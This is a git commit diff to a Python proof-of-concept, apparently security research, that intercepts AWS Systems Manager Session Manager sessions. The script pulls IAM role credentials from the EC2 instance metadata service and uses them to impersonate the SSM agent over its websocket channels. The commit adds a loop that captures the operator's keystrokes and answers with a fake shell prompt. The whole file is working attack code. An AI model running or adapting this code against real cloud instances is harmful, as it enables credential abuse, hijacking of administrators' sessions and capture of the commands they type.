19d2c374a5632e2be295e98fdb76aa9a6921411d
Nick Frichette <nick@frichetten.com>
2021-01-15 14:02:33 -0600

    Simple interception implementation

--- ssm-session-interception/ssm-session-interception-poc.py
+++ ssm-session-interception/ssm-session-interception-poc.py
@@ -9,9 +9,11 @@ def retrieve_meta() -> json:
     resp = requests.get("http://169.254.169.254/latest/dynamic/instance-identity/document")
     return json.loads(resp.text)
 
+
 def retrieve_role_name() -> str:
     resp = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
     return resp.text
+
 
 def retrieve_role_creds(role_name) -> json:
     headers = { "X-Aws-Ec2-Metadata-Token-Ttl-Seconds": "21600" }
@@ -22,9 +24,11 @@ def retrieve_role_creds(role_name) -> json:
     resp = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role_name, headers=headers)
     return json.loads(resp.text)
 
+
 def retrieve_role_creds_from_file(file_name):
     with open(file_name, 'r') as r:
         return json.loads("".join(r.readlines()))
+
 
 def parse_control_channel(data):
     lines = data.split("\n")
@@ -32,13 +36,16 @@ def parse_control_channel(data):
     url = lines[3][lines[3].find(">")+1:lines[3].find("</")] 
     return access_token, url
 
+
 def parse_data_channel(data):
     lines = data.split("\n")
     access_token= lines[2][lines[2].find(">")+1:lines[2].find("</")]
     return access_token
 
+
 def create_date():
     return int(round(time.time() * 1000))
+
 
 def fetch_access_token_url(meta, role_creds):
     # Get the control_channel access_token and websocket uri
@@ -47,23 +54,28 @@ def fetch_access_token_url(meta, role_creds):
 
     return access_token, url
 
+
 def build_control_channel(meta, role_creds, access_token, url):
     path = url[url.find("/v1"):]
     control_channel_info = aws_requests.initiate_websocket_connection(url, path, access_token, role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])
 
     return control_channel_info
 
+
 def craft_cc_message(access_token):
     return '{"Cookie":null,"MessageSchemaVersion":"1.0","RequestId":"'+str(uuid.uuid4())+'","TokenValue":"'+access_token+'","AgentVersion":"3.0.161.0","PlatformType":"linux"}'
 
+
 def craft_dc_message(access_token):
     return '{"MessageSchemaVersion":"1.0","RequestId":"'+str(uuid.uuid4())+'","TokenValue":"'+access_token+'","ClientInstanceId":"i-03a6d204ea995a6fa","ClientId":""}'
+
 
 def build_data_channel(session_id, access_token, role_creds):
     path = "/v1/data-channel/"+session_id+"?role=publish_subscribe"
     data_channel_info = aws_requests.initiate_websocket_connection("wss://ssmmessages.us-east-1.amazonaws.com/v1/data-channel/"+session_id+"?role=publish_subscribe", path, access_token, role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])
 
     return data_channel_info
+
 
 def craft_agent_session_state(session_id):
     msg = aws_msg.serialize(
@@ -77,25 +89,27 @@ def craft_agent_session_state(session_id):
             0)                                                                                  # Payload Type
     return msg
 
-def craft_acknowledge(session_id):
+
+def craft_acknowledge(session_id, seq_num):
     msg = aws_msg.serialize(
             '{"AcknowledgedMessageType":"input_stream_data","AcknowledgedMessageId":"' + session_id + '","AcknowledgedMessageSequenceNumber":0,"IsSequentialMessage":true}', 
             "acknowledge",                                                                      # Message Type
             1,                                                                                  # Schema Version
             create_date(),                                                                      # Created Date
-            0,                                                                                  # Sequence Number 
+            seq_num,                                                                            # Sequence Number 
             3,                                                                                  # Flags
             uuid.uuid4(),                                                                       # Message ID
             0)                                                                                  # Payload Type
     return msg
 
-def craft_output_stream_data(message):
+
+def craft_output_stream_data(message, seq_num):
     msg = aws_msg.serialize(
             message,                                                                            # Message
             "output_stream_data",                                                               # Message Type
             1,                                                                                  # Schema Version
             create_date(),                                                                      # Created Date
-            0,                                                                                  # Sequence Number
+            seq_num,                                                                            # Sequence Number
             1,                                                                                  # Flags
             uuid.uuid4(),                                                                       # Message ID
             1)                                                                                  # Payload Type
@@ -137,18 +151,48 @@ data_channel.send(craft_dc_message(access_token))
 # From here on out we need to react to responses and send what we want
 # We react by looking at what the message type is
 data_channel.send_binary(craft_agent_session_state(first_response_content['SessionId']))
+msg = craft_output_stream_data("$ ", 0)
+data_channel.send_binary(msg)
 
+
+msg = aws_msg.deserialize(data_channel.recv())
 msg = aws_msg.deserialize(data_channel.recv())
 
 # acknowledge
-msg = craft_acknowledge(msg.messageId)
+msg = craft_acknowledge(msg.messageId, 0)
 data_channel.send_binary(msg)
 
 # output stream
-msg = craft_output_stream_data("$")
+msg = craft_output_stream_data("$ ", 0)
 data_channel.send_binary(msg)
 
 msg = aws_msg.deserialize(data_channel.recv())
+sq_num = 1
+message = ""
 
+# Loop
+while True:
+    msg = aws_msg.deserialize(data_channel.recv())
+
+    if "input" in msg.messageType and msg.sequenceNumber == sq_num:
+        payload = msg.payload.decode()
+
+        message = message + payload
+        msgid = msg.messageId
+
+        msg = craft_acknowledge(msgid, sq_num)
+        aws_msg.deserialize(msg)
+        data_channel.send_binary(msg)
+
+        if "\r" in payload:
+            payload = "\r\nlol no\r\n$ "
+        msg = craft_output_stream_data(payload, sq_num)
+        aws_msg.deserialize(msg)
+        data_channel.send_binary(msg)
+        sq_num += 1
+
+    # We can ignore acknowledge messages coming from AWS
+
+    print(message)
 
 
